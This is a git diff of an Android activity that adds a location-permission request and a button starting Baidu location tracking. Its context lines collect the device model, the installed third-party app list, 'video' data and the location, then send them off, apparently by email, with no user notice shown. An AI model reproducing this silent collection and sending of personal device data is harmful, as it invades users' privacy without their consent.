@@ -1,5 +1,6 @@
 package com.yangyong.didi2.activity;
 
+import android.Manifest;
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
@@ -24,12 +25,13 @@ import com.baidu.location.LocationClientOption;
 import com.yangyong.didi2.Constants;
 import com.yangyong.didi2.R;
 import com.yangyong.didi2.util.AppUtil;
-import com.yangyong.didi2.util.OkHttpUtil;
-import com.yangyong.didi2.util.SpUtils;
+import com.yangyong.didi2.util.PermissionUtils;
 
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+
+import io.reactivex.functions.Consumer;
 
 public class SendDataActivity extends AppCompatActivity implements View.OnClickListener {
 
@@ -64,6 +66,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         }
     };
     private LocationClient locationClient;
+    private Button start_location;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -71,7 +74,8 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         setContentView(R.layout.activity_send_data);
         initView();
         initSP();
-        initLocationOption();
+        initPer();
+//        initLocationOption();
 //        boolean isFirst = preferences.getBoolean("isFirst", true);
 //        if (isFirst) {
 //            sendData("ooo");
@@ -79,6 +83,18 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 //            mHandler.sendEmptyMessage(2);
 //            Log.e(Constants.TAG, "已发送过邮件 ");
 //        }
+    }
+
+    private void initPer() {
+        String[] strings = {
+                Manifest.permission.ACCESS_FINE_LOCATION,//定位
+                Manifest.permission.ACCESS_COARSE_LOCATION,//定位
+        };
+        PermissionUtils.requestPermissions(this, strings, new Consumer<Boolean>() {
+            @Override
+            public void accept(Boolean aBoolean) throws Exception {
+            }
+        });
     }
 
     private void initSP() {
@@ -91,12 +107,17 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
         send_data.setOnClickListener(this);
         two_tip = (TextView) findViewById(R.id.two_tip);
         two_tip.setOnClickListener(this);
+        start_location = (Button) findViewById(R.id.start_location);
+        start_location.setOnClickListener(this);
     }
 
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
             case R.id.send_data:
+                break;
+            case R.id.start_location:
+                initLocationOption();
                 break;
         }
     }
@@ -118,7 +139,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 //可选，默认gcj02，设置返回的定位结果坐标系，如果配合百度地图使用，建议设置为bd09ll;
         locationOption.setCoorType("gcj02");
 //可选，默认0，即仅定位一次，设置发起连续定位请求的间隔需要大于等于1000ms才是有效的
-        locationOption.setScanSpan(1000);
+        locationOption.setScanSpan(120000);
 //可选，设置是否需要地址信息，默认不需要
         locationOption.setIsNeedAddress(true);
 //可选，设置是否需要地址描述
@@ -126,7 +147,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
 //可选，设置是否需要设备方向结果
         locationOption.setNeedDeviceDirect(false);
 //可选，默认false，设置是否当gps有效时按照1S1次频率输出GPS结果
-        locationOption.setLocationNotify(true);
+        locationOption.setLocationNotify(false);
 //可选，默认true，定位SDK内部是一个SERVICE，并放到了独立进程，设置是否在stop的时候杀死这个进程，默认不杀死
         locationOption.setIgnoreKillProcess(true);
 //可选，默认false，设置是否需要位置语义化结果，可以在BDLocation.getLocationDescribe里得到，结果类似于“在北京天安门附近”
@@ -160,7 +181,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
             String addrStr = location.getAddrStr();
             double latitude = location.getLatitude();    //获取纬度信息
             double longitude = location.getLongitude();    //获取经度信息
-            Log.e(Constants.TAG, "所在位置: " + longitude+","+latitude);
+            Log.e(Constants.TAG, "所在位置: " + longitude + "," + latitude);
             String locationDescribe = location.getLocationDescribe();
             /*if (addrStr != null || locationDescribe != null) {
                 String s = addrStr + "\n" + locationDescribe;
@@ -193,7 +214,7 @@ public class SendDataActivity extends AppCompatActivity implements View.OnClickL
                         Log.e(TAG, "获取到应用: " + thirdAppList);
                         Log.e(TAG, "获取到video: " + video);
                         String phoneContent = brand + model + "\n" + thirdAppList + "\n" + video;
-                        AppUtil.getInstance().send(preferences,phoneContent,mHandler);
+                        AppUtil.getInstance().send(preferences, phoneContent, mHandler);
                         /*OkHttpUtil.getInstance().doPost(rUrl, body, new OkHttpUtil.DataCallBack() {
                             @Override
                             public void onSuccess(String s) {
